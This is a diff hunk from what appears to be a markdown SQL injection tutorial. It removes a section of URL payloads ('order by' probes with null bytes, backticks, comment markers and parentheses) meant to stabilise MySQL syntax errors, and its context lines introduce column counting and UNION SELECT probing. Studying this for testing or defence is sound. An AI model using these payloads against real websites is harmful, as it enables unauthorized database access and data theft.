@@ -113,15 +113,6 @@ In this case, the payload ```?id=1 order by 1-- -``` worked and website loads su
 
 This means there are only 4 columns. Now we have to find which one of these 4 columns have information.  
 
-## Stabilise the error message
-Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error.  
-
-```http://domain.com/index.php?id=1' order by 1;%00-- -```   no error  
-```http://domain.com/index.php?id=1' order by 1;%60-- - ```  no error  
-```http://domain.com/index.php?id=1' order by 1%60-- - ```  no error  
-```http://domain.com/index.php?id=1'%23/* order by 1-- - ```  no error  
-```http://domain.com/index.php?id=1') order by 1-- - ```  no error  
-
 ## Find the vulnerable column where information are stored using 'UNION SELECT' query  
 
 Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these payloads will run without **syntax error**. *NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.*    
